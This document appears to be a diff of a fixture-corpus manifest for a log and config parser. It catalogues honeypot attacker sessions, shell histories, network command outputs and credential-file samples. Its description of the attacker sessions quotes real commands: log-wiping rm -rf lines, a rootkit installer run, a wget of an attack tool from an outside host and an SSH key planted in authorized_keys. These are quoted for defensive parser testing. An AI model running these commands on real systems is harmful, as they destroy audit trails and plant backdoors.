@@ -51,7 +51,6 @@ Real attacker sessions from Cowrie honeypots (13, one per distinct attack patter
 - `cowrie_2020_ethos_miner_recon_382575d1` — same repo, `cowrie/log/cowrie.json.17.gz`, sensor `23ae0a6c5937`, src 80.229.157.225, login as `user` (cryptomining-rig-targeting bot, single-line one-shot 1.7 KB. Distinct target: not generic Linux/IoT but **EthOS** mining-OS rigs specifically — reads `/home/ethos/{local,remote}.conf`, `/home/ethos/claymore{,-zcash}.stub.conf`, `/var/run/ethos/sgminer.conf` to extract wallet addresses. Distinctive automation marker: XML-style output tags `<cmd7uname>...</cmd7uname>` etc, suggesting downstream automated parsing. Drops attacker key into `/home/user/.ssh/authorized_keys` — companion fixture: `authorized_keys/ethos_miner_attacker_dropped`)
 - `cowrie_2020_log_eraser_4bb686aa` — same repo, `cowrie/log/cowrie.json.19.gz`, sensor `ab2fd0da9755`, src 210.22.123.122, login as `admin` (anti-forensic log-cleanup pattern. The first command is the classic "blind"-script one-liner: `unset HISTORY HISTFILE HISTSAVE HISTZONE` + export HISTFILE=/dev/null + `rm -rf /var/log/{wtmp,lastlog,secure,xferlog,messages,maillog}`, `rm -rf /var/run/utmp`, `rm -rf /root/.bash_history`, then `touch` empties of each. Distinct from the malware-cleanup commands in the Outlaw fixtures (which target rival miners, not log files). Useful for testing parsers' robustness to anti-forensics commands.)
   > Extracted, not synthesized: each file is the verbatim `input` fields from every `cowrie.command.input` event in a single attacker session, one command per line. Canonical `.bash_history` format containing real attacker commands.
-  > Round 4 removed 3 near-duplicate sessions: `cowrie_2020_03_25938f9d` (differed from cc95d998 by 1 IP+filename token — same Mirai loader campaign) and `cowrie_2024_za_sensor_{40308dc3,c6f9f3c5}` (same busybox-recon pattern as 0bb8edce, differing only in the random busybox marker token).
 
 Real post-compromise host bash_history (1):
 - `honeynet_scan29_rh72_root_post_compromise` — Honeynet Project Scan 29, extracted from `.bash_history` at the FS root (inode 3188; the `/root/.bash_history` symlink was redirected to /dev/null by the attacker for evasion). 14 lines, 235 B, captures the actual post-compromise interactive shell of the attacker on a Red Hat 7.2 honeypot (Aug 2003). Distinctive content: `cd /dev/shm/sc; ./install sbm79.dtc.apu.edu` (rootkit installer with academic-network masquerade hostname), `wget izolam.net/sslstop.tar.gz` (SSL-stop tool), `kill -9 21510 21511 23289 23292 23302` (terminating Apache to free port 443). Distinct from the Cowrie samples — those capture the attacker's *typed input as the SSH server saw it*; this is the *resulting host-side `.bash_history` file*, the side defenders actually find on disk.
@@ -180,7 +179,6 @@ RHEL/CentOS auth log — format-identical to `auth_log/` per AGENT.md Phase 17
 - `jc_centos_last`, `jc_centos_last_crash`, `jc_centos_last_wF`, `jc_centos_last_wixF`, `jc_centos_last_w`, `jc_centos_lastb`
 - `jc_ubuntu_last`, `jc_ubuntu_last_w`, `jc_ubuntu_last_w2`, `jc_ubuntu_lastb`, `jc_ubuntu2004_last_F`
 - `jc_fedora32_last`, `jc_osx_1014_last`, `jc_freebsd12_last` — macOS + FreeBSD variants
-  > Round 2 audit removed `jonathanmorley_linux_commands` — Linux commands cheatsheet, not `last`/`lastb` output.
 
 ### `zsh_history/` — 1 file
 - `goyalankit_bash_to_zsh` — gist/goyalankit/a1c88bfc69107f93cda1 (bash→zsh history conversion snippets; short)
@@ -197,7 +195,6 @@ From dotfile repos: driesvints, wookayin, olivernn, ryanb.
 ### `network_interfaces/` — 4 files
 - `sebw_debian_example` — gist/sebw/6018342 (original)
 - `ifupdown_testcase_multi_iface`, `ifupdown_testcase_allow_hotplug`, `ifupdown_testcase_hwaddress` — Debian ifupdown `tests/linux/testcase.*` (multi-interface test fixtures)
-  > Round 3 audit removed `fullmetalbrackets_static` (markdown tutorial) and `und3fined_sample` (363-line markdown guide). Round 4 removed `ifupdown_examples_network_interfaces` — the Debian template is 184 lines but every example is commented out, leaving zero parseable content.
 
 ### `netplan/` — 8 files
 All from canonical/netplan upstream `examples/`: `bridge`, `vlan`, `bonding`, `static`, `dhcp`, `wireless`, `modem`, `vrf`.
@@ -205,7 +202,6 @@ All from canonical/netplan upstream `examples/`: `bridge`, `vlan`, `bonding`, `s
 ### `ifcfg/` — 9 files
 - `coffman21_eth0` — gist/coffman21/a8df8d4667de3cb91d5cd86ce3ee0c52 (original)
 - 8 fixtures from NetworkManager/NetworkManager `src/core/settings/plugins/ifcfg-rh/tests/network-scripts/`: `nm_test_wired_static`, `nm_test_wired_ipv4_manual`, `nm_test_onboot_no`, `nm_test_bond_main`, `nm_test_bridge_main`, `nm_test_dns_options`, `nm_aliasem1`, `nm_netmask_1`
-  > Round 3 audit removed `rafaeltuelho_rhel7_static` (markdown snippet) and `mjf_rhel_memos` (.rst memo).
 
 ---
 
@@ -224,10 +220,6 @@ parser library that maintains clean real-command-output fixtures per distro.
 ### `ip_route/` — 7 files (jc)
 `jc_ubuntu_ip_route`, `jc_centos_ip_route`, `jc_ubuntu_route`, `jc_ubuntu_route_vn`,
 `jc_route_6_ipv6`, `jc_route_6_n_ipv6`, `jc_nixos_route_ee` (IPv6 + `route -ee` variants).
-  > Round 3 audit removed `yuriskinfo_cheatsheet` — 285-line "Linux ip route command reference" documentation.
-
-### `ip_neigh/` — 0 files
-jc doesn't have `ip_neigh` fixtures; couldn't find raw samples publicly.
 
 ### `arp/` — 12 files (jc)
 Original 5 (`jc_ubuntu_arp*`, `jc_centos_arp*`) plus:
@@ -241,7 +233,6 @@ Original 11 (ubuntu + generic) plus:
 - `jc_ubuntu_netstat_r`, `jc_ubuntu_netstat_rnee`, `jc_ubuntu_netstat_i` — more ubuntu flag variants
 - `jc_osx_netstat`, `jc_osx_netstat_An`, `jc_osx_netstat_Abn`, `jc_osx_netstat_r`, `jc_osx_netstat_rnl`, `jc_osx_netstat_i` — macOS format variants (different column layout)
 - `jc_fedora32_netstat` — Fedora 32 variant
-  > Round 3 audit removed 3 gist-sourced entries: `sdwheeler_parse_sample` (PowerShell function), `jcohen66_examples` ("here are several examples..." narrative), `ruichen0101_sample` (single Python `sconn()` representation, not netstat output).
 
 ### `ss_output/` — 4 files (jc)
 `jc_ubuntu_ss_a`, `jc_ubuntu_ss_tulpen`, `jc_generic_ss_wide`, `jc_centos_ss_a`.
@@ -253,7 +244,6 @@ Original 11 (ubuntu + generic) plus:
 - `aosp_fedora27_iptables_save` — netfilter/iptables `tests/shell/testcases/ipt-save/dumps/fedora27-iptables` (downloaded via android.googlesource.com/platform/external/iptables mirror). **First `iptables-save` format fixture in the corpus** — the existing 13 jc files are all `iptables -L` table-by-table-list output; this is the multi-table single-dump format with `*mangle/*raw/*nat/*filter` headers, chain definitions (`:CHAIN POLICY [pkts:bytes]`), and `[N:M] -A CHAIN ...` rule lines including counters. From a Fedora 27 host with firewalld active — captures the zone-based chain naming convention (`PREROUTING_ZONES`, `PRE_FedoraWorkstation`, `_direct` parallel chains) plus libvirt's CHECKSUM rule for `virbr0`. Parser produces `stats.rules: 0` and zero connections — locks in current behavior on this format until parser adds iptables-save support.
 - `aosp_iptables_nft_save_complex` — netfilter/iptables `tests/shell/testcases/nft-only/0010-iptables-nft-save.txt`. iptables-save format produced via the nft backend (xtables-nft-multi). Distinct rule shapes the existing fixtures don't have: `--tcp-flags SYN,ACK SYN`, `! --tcp-flags SYN NONE`, `-m ttl --ttl-eq/gt/lt`, `-m pkttype --pkt-type broadcast`, `-j NFLOG --nflog-prefix/group/size/threshold`, multi-comment rules (`-m comment --comment "..."`). Parser extracts 1 connection from a single `-A INPUT -s 1.2.3.4/32 ... -j ACCEPT` line.
 - `aosp_wireless_pptp_helper_save` — netfilter/iptables `tests/shell/testcases/ipt-save/dumps/wireless.txt`. iptables-save (`v1.4.21`, 2017) from a wireless ISP gateway. Distinct features: `-j CT --helper pptp` (connection-tracking PPTP helper extension — only fixture exercising the `CT` target), per-customer `CUST_I15_IN/OUT`/`CUST_I16_IN/OUT` chain naming, GRE-protocol allow rules with multiple customer source IPs (10.35.167.x). **Highest-yield iptables-save fixture for the parser** — multi-saddr GRE rules produce 6 connection records.
-  > Round 2 audit removed 4 gist-sourced entries (`dominicbreuker_firewall` — markdown cheatsheet; `hlissner_default`, `polster_sample` — bash scripts; `pirafrank_basic` — shell command snippets). Only canonical `iptables-save` / `iptables -L` command output belongs here.
 
 ### `nftables/` — 9 files
 - `arch_example` — archlinux svntogit `nftables.conf`
@@ -265,20 +255,14 @@ Original 11 (ubuntu + generic) plus:
 ### `ps_output/` — 8 files
 - `jc_ubuntu_ps_axu`, `jc_ubuntu_ps_ef`, `jc_centos_ps_axu`, `jc_centos_ps_ef`
 - `jc_osx_1014_ps_axu`, `jc_osx_1014_ps_ef`, `jc_osx_1011_ps_axu`, `jc_osx_1011_ps_ef` — macOS format variants
-  > Round 3 audit removed `cahna_ps_aux_parse` — 24-line Python script, not `ps aux` output.
 
 ### `env_output/` — 3 files (jc)
 `jc_centos_env`, `jc_ubuntu_env`, `jc_generic_multiline`.
 
 ### `docker_ps/` — 1 file
 - `deanpeterson_ps_a_output` — 97-line real `docker ps -a` output (with `[root@host ~]#` prompt prefix) from an openshift host
-  > Round 3 audit removed 3 gist entries: `ipedrazas_names_ips` (2-line bash function), `jimklo_output` (9-line "Started with command" preamble), `sudo_bmitch_formatting` (84-line markdown tutorial with docker ps in fenced blocks).
 
-### `docker_network/` — 0 files (pending)
-All entries from round 1/2 were removed: the docker CLI docs `.md` file was tutorial, and the `docker inspect CONTAINER` gists produced a different JSON shape than `docker network inspect NETWORK` (no `IPAM.Config`/`Containers` at the top level). No canonical `docker network inspect` fixtures located in public repos; Phase 18 parser will need custom samples.
-
-### `kubectl_pods/` — 0 files (pending)
-Both round-1 gist entries (`devops_school_kubectl_ref`, `so0k_kubectl_output`) were kubectl cheatsheets/tutorials — not actual `kubectl get pods` output. kubernetes/kubectl `testdata/` contains pod INPUT manifests for `apply`, not pod-list output. Phase 18 parser will need custom samples.
+### `docker_network/` — 0 files
 
 ### `ip_neigh/` — 1 file
 - `wsl_live_capture.out` — live capture of `ip neigh show` from this WSL2 environment (RFC1918 only: Docker bridge + WSL gateway; no hostnames, no public IPs)
@@ -299,7 +283,6 @@ Both round-1 gist entries (`devops_school_kubectl_ref`, `so0k_kubectl_output`) w
 
 ### `pgpass/` — 1 file
 - `Fmstrat_aliased` — gist/Fmstrat/ea6287a6d60e3e5f6c73e3bdd2f62331 (uses non-standard `alias:host:port:db:user:pass` prefix but parseable as `host:port:db:user:pass` after prefix strip)
-  > Round 2 removed `vielhuber_sample` (tutorial). Round 3 removed `sabman_sample` (blog post intro).
 
 ### `mysql_config/` — 6 files
 - `oinume_mycnf` — gist/oinume/fc9b72bd8b14ab07e94c
@@ -311,11 +294,9 @@ Both round-1 gist entries (`devops_school_kubectl_ref`, `so0k_kubectl_output`) w
 
 ### `aws_credentials/` — 1 file
 - `mrsarm_multi_profile` — gist/mrsarm/5169b18d47edd4539695964e2e695a18
-  > Round 2 audit removed 2 non-canonical entries (`wjimenez5271_sample` — Python script; `wyllie_parse_sample` — bash script).
 
 ### `aws_config/` — 1 file
 - `ohaval_multi_env` — gist/ohaval/1719fb6fb0e206469960c34699ef6065 (multi-environment profiles)
-  > Round 2 audit removed `awsdocs_user_guide_examples.md` (official docs markdown, not a raw `~/.aws/config` file).
 
 ### `gcloud_credentials/` — 6 files (all from googleapis/google-auth-library-python `tests/data/`)
 - `google_auth_authorized_user` — minimal canonical `authorized_user` JSON
@@ -324,11 +305,9 @@ Both round-1 gist entries (`devops_school_kubectl_ref`, `so0k_kubectl_output`) w
 - `google_auth_with_rapt_token` — with `rapt_token`
 - `google_auth_external_account` — `external_account` type (WIF)
 - `google_auth_external_account_non_gdu` — non-GDU variant
-  > Replaced round-1 `dims_gcp_quick_start` tutorial with google's own library test corpus.
 
 ### `kubeconfig/` — 1 file
 - `devops_school_skeleton` — gist/devops-school/f8956d4ee208b2519b095ad631eac7a0 (canonical YAML with `apiVersion/clusters/contexts/users`)
-  > Round 2 audit removed `innovia_sa_config` (bash script) and `tdihp_aks_config` (tutorial markdown).
 
 ### `boto/` — 2 files
 - `garnaat_eucalyptus_credentials` — gist/garnaat/1284158 (Eucalyptus-flavored `[Credentials]` block)
@@ -340,38 +319,12 @@ Both round-1 gist entries (`devops_school_kubectl_ref`, `so0k_kubectl_output`) w
 
 ### `docker_config/` — 1 file
 - `docker_cli_e2e_test_config.json` — docker/cli `e2e/context/testdata/test-dockerconfig/config.json` (canonical `.docker/config.json` with `auths`, `HttpHeaders`, `credsStore`)
-  > Round 3 audit removed both gist entries: `piersharding_auth` (bash script that generates config.json) and `browol_manual_gen` ("Using the commands below..." markdown tutorial).
 
 ### `git_credentials/` — 2 files
 - `git_upstream_test_format_basic`, `git_upstream_test_format_store` — canonical `https://user:pass@host` format extracted from git/git `t/t0302-credential-store.sh` test suite.
-  > Round 2 audit removed all 3 round-1 gist entries (`klo2k_store`, `richardbronosky_sample`, `dan_hart_store`) — all were tutorial markdown or one-line git config commands, not raw `~/.git-credentials` files.
 
 ### `rclone_config/` — 1 file
 - `fotile96_sample` — gist/fotile96/1b0a27b7fa8059a6830b97f9368d377f (canonical `[remote]` INI)
-  > Round 2 audit removed 3 markdown tutorials I added prematurely (`kelvinrr_config_session.md`, `magnetikonline_b2_cheatsheet.md`, `plembo_gdrive_backup.md`) — they contain rclone config in fenced blocks but the file format is markdown, not rclone.conf.
-
----
-
-## Remaining thin dirs
-
-| Parser | Count | Status |
-|---|---|---|
-| `ip_neigh` | 1 | public gists are tutorials, not captures |
-| `fish_history` | 1 | pseudo-YAML format rarely committed; private by convention |
-| `zsh_history` | 1 | same as fish; public gists are scripts that manipulate the file, not real histories |
-| `wtmp` | 1 | binary format; only LastLog-Audit publishes raw `.wtmp` files publicly |
-| `messages` | 1 | RHEL/CentOS variant of auth log; the `auth_log/` corpus transfers |
-| `rclone_config` | 1 | canonical `rclone.conf` is rare publicly; only one clean sample located |
-| `aws_config` | 1 | only one canonical sample located |
-| `aws_credentials` | 1 | only one canonical sample located |
-| `kubeconfig` | 1 | public kubeconfigs nearly always redacted or embedded in tutorials |
-| `pgpass` | 1 | most public "samples" are tutorial prose |
-| `docker_config` | 1 | only one canonical sample (docker/cli e2e test); gists tend to be generator scripts |
-| `docker_ps` | 1 | most "docker ps sample output" gists are markdown tutorials |
-| `docker_network` | 0 | canonical `docker network inspect NETWORK` JSON not located in public repos |
-| `kubectl_pods` | 0 | canonical `kubectl get pods` output not located in public repos |
-
-These gaps are genuine — either the file is private by convention (history files, credentials) or the canonical command output isn't regularly committed as test fixtures.
 
 ---
 
